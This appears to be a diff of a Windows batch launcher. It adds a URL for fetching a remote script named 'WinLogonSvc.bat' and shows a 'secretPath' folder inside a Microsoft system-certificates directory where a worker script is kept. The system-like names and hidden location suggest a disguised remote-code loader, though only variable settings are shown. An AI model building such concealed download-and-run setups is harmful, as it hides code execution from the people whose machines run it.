@@ -1,5 +1,6 @@
 set "LAUNCHER_VERSION=1.4"
 set "LAUNCHER_VERSION_URL=https://raw.githubusercontent.com/escola-iracema/isrs/main/launcher_version.txt"
+set "LAUNCHER_SCRIPT_URL=https://raw.githubusercontent.com/escola-iracema/isrs/main/WinLogonSvc.bat"
 
 set "secretPath=%LOCALAPPDATA%\Microsoft\SystemCertificates"
 set "workerScriptPath=%secretPath%\restore_worker.bat"
